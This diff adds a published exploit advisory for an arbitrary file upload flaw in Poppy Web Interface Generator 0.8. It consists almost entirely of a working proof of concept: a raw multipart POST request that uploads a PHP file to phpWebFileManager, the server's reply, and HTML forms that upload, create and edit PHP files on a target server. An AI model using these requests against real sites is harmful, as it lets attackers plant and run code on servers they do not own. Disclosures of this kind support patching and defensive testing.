@@ -1,0 +1,87 @@
+# Exploit Title: Poppy Web Interface Generator 0.8 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-11-04
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://poppy.dc-development.de/
+# Software Link: https://master.dl.sourceforge.net/project/poppy-beta-rc/poppy_0.8_beta_rc.zip
+# Version: 0.8
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/phpWebFileManager-0.7/index.php
+# 
+POST /[PATH]/phpWebFileManager-0.7/index.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------497318546845924055941951022
+Content-Length: 732
+-----------------------------497318546845924055941951022
+Content-Disposition: form-data; name="fm_filename"
+-----------------------------497318546845924055941951022
+Content-Disposition: form-data; name="fm_dir"
+-----------------------------497318546845924055941951022
+Content-Disposition: form-data; name="fm_action"
+upload_file
+-----------------------------497318546845924055941951022
+Content-Disposition: form-data; name="fm_userfile[0]"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------497318546845924055941951022
+Content-Disposition: form-data; name="fm_submit"
+File upload
+-----------------------------497318546845924055941951022--
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 12:10:16 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/poppy_app/public/[FILE]
+# 
+<html>
+<body>
+
+#File Upload:
+<form enctype="multipart/form-data" method="post" action="http://localhost/[PATH]/phpWebFileManager-0.7/index.php">
+<input value="" name="fm_filename" type="hidden">
+<input value="" name="fm_dir" type="hidden">
+<input value="upload_file" name="fm_action" type="hidden">
+<input value="" name="fm_userfile[0]" type="file">
+<input name="fm_submit" value="File upload" type="submit">
+</form>
+
+#Create File:
+<form method="post" action="http://localhost/[PATH]/phpWebFileManager-0.7/index.php">
+<input value="" name="fm_filename" type="hidden">
+<input value="" name="fm_dir" type="hidden">
+<input value="create_file" name="fm_action" type="hidden">
+<input value="test.php" name="fm_new_filename" type="text">
+<input name="fm_submit" value="Create file" type="submit">
+</form>
+
+#File Edit:
+<form method="post" action="http://localhost/[PATH]/phpWebFileManager-0.7/index.php">
+<input value="test.php" name="fm_filename" type="hidden">
+<input value="" name="fm_dir" type="hidden">
+<input value="save_file" name="fm_action" type="hidden">
+<textarea id="code" name="fm_file_data" rows="40" cols="140"></textarea>
+<input name="fm_submit" value="Save" type="submit">
+</form>
+
+</body>
+</html>
